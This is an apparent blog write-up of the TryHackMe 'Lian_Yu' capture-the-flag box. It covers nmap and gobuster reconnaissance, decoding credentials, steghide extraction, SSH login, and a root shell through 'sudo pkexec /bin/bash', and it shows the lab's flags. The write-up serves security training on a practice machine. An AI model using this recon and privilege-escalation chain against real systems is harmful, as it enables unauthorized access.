---
title: "TryHackMe: Lian_Yu"
date: 2020-12-21 12:21:00 -0800
categories: [tryhackme, writeup]
tags: [writeup]
toc: true
---

> Welcome to Lian_YU, an Arrowverse themed CTF box!

Another boot2root box, starting off with an nmap scan:

## nmap

```
nmap -sC -sV -o nmap.nmap 10.10.225.12
```

```
kali@kali:~/Desktop/thm/lian_yu$ nmap -sC -sV -o nmap.nmap 10.10.225.12
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-21 02:02 EST                                                                                                                                          
Nmap scan report for 10.10.225.12                                                                                                                                                                        
Host is up (0.16s latency).                                                                                                                                                                              
Not shown: 996 closed ports                                                                                                                                                                              
PORT    STATE SERVICE VERSION                                                                                                                                                                            
21/tcp  open  ftp     vsftpd 3.0.2                                                                                                                                                                       
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)                                                                                                                                       
| ssh-hostkey:                                                                                                                                                                                           
|   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)                                                                                                                                           
|   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)                                                                                                                                           
|   256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)                                                                                                                                          
|_  256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)
80/tcp  open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Purgatory
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          45921/tcp6  status
|   100024  1          45998/tcp   status
|   100024  1          48296/udp   status
|_  100024  1          50294/udp6  status
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.55 seconds
```

FTP, SSH, a web server, and RPC. This is my first time seeing port 111 open on a box and I'm not too sure what to do with it.

Putting that aside for now, I checked out the web server and there was nothing interesting. Anonymous FTP is not enabled. I have no where to go with what I have so far, so I decided to brute-force directories on the web server.

## gobuster

```
gobuster dir -u 10.10.225.12 -w /usr/share/wordlists/rockyou.txt
```

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.237.62
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/21 14:15:38 Starting gobuster
===============================================================
/island (Status: 301)
/server-status (Status: 403)
===============================================================
2020/12/21 15:12:24 Finished
===============================================================
```

Looks like we found ``/island``

```
 Ohhh Noo, Don't Talk...............

I wasn't Expecting You at this Moment. I will meet you there

You should find a way to Lian_Yu as we are planed. The Code Word is:
vigilante
```

After going through a few more wordlists, I realized that I was supposed to scan within island for another hidden directory.

```
kali@kali:~/Desktop/thm/lian_yu$ gobuster dir -u 10.10.107.8/island -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.107.8/island
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/21 16:42:14 Starting gobuster
===============================================================
/2100 (Status: 301)
```

We found ``/island/2100``.

```
<!-- you can avail your .ticket here but how?   -->
```

Hmm.. ``.ticket`` looks like a file extension. Running dirbuster again, but this time looking for ``.ticket`` files.

```
kali@kali:~/Desktop/thm/lian_yu$ gobuster dir -u 10.10.107.8/island/2100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x ticket
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.107.8/island/2100
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     ticket
[+] Timeout:        10s
===============================================================
2020/12/21 16:51:12 Starting gobuster
===============================================================
/green_arrow.ticket (Status: 200)
```

Found it! Let's look at the page.

```
This is just a token to get into Queen's Gambit(Ship)


RTy8yhBQdscX
```

Looks like we got some kind of password. I tried to use it for the next step of the box, however it did not work. There is a hint for this section:

> Looks like base? https://gchq.github.io/CyberChef/

... That's kinda stupid. Using cyberchef, I was able to convert the string to a password for FTP.

base58 -> !#th3h00d

## ftp

```
Username: vigilante
Password: !#th3h00d
```

We find three files:

```
aa.jpg
Leave_me_alone.png
Queen's_Gambit.png
```

I tried opening up each of them. ``aa.jpg`` and ``Queen's_Gambit.png`` are normal image files, however ``Leave_me_alone.png`` fails to open.

The magic bytes are wrong for a PNG file. After fixing it, the image shows that the password is ``password``, however I am unable to SSH into any user with this password.

I noticed that one of the files I got from FTP is jpg, and attempted to use ``steghide`` on the file.

```
kali@kali:~/Desktop/thm/lian_yu$ steghide extract -sf aa.jpg
Enter passphrase: 
wrote extracted data to "ss.zip".
```

Awesome!

After extracting the ZIP file, I find a file with a password inside.

```
kali@kali:~/Desktop/thm/lian_yu$ cat shado
M3tahuman
```


## user.txt

At this point, I was completely lost on what user to SSH into to get user. With all the information I had collected up to this point I was unable to get in. I ended up having to ask someone who already completed the box for help locating the username. They told me to go back to the FTP server.

On the FTP server, there are two users: ``vigilante`` and ``slade``. The SSH password found above worked for ``slade``.


```
kali@kali:~/Desktop/thm/lian_yu$ ssh slade@10.10.107.8
slade@10.10.107.8's password: 
                              Way To SSH...
                          Loading.........Done.. 
                   Connecting To Lian_Yu  Happy Hacking

██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗██████╗ 
██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝╚════██╗
██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗   █████╔╝
██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝  ██╔═══╝ 
╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗███████╗
 ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝


        ██╗     ██╗ █████╗ ███╗   ██╗     ██╗   ██╗██╗   ██╗
        ██║     ██║██╔══██╗████╗  ██║     ╚██╗ ██╔╝██║   ██║
        ██║     ██║███████║██╔██╗ ██║      ╚████╔╝ ██║   ██║
        ██║     ██║██╔══██║██║╚██╗██║       ╚██╔╝  ██║   ██║
        ███████╗██║██║  ██║██║ ╚████║███████╗██║   ╚██████╔╝
        ╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝    ╚═════╝  #

slade@LianYu:~$ cat ~/user.txt
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_******}
                        --Felicity Smoak

slade@LianYu:~$
```

## Priv Esc and root.txt

Let's see if we can run anything as root...

```
slade@LianYu:~$ sudo -l
[sudo] password for slade: 
Sorry, try again.
[sudo] password for slade: 
Sorry, try again.
[sudo] password for slade: 
Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
```

So we can run ``/usr/bin/pkexec``. 

I looked it up on [GTFOBins](https://gtfobins.github.io/gtfobins/pkexec/)

```
slade@LianYu:~$ sudo /usr/bin/pkexec /bin/bash
root@LianYu:~# cat ~/root.txt
                          Mission accomplished



You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 



THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_****************}
                                                                              --DEATHSTROKE

Let me know your comments about this machine :)
I will be available @twitter @User6825

root@LianYu:~# 
```

Super easy privilege escalation!

## Conclusion

This is a stupid box. You had to guess A LOT in order to figure out what to fuzz, which user went where, and it was not a logical/practical whatsoever. I wish I did not waste time solving it out.







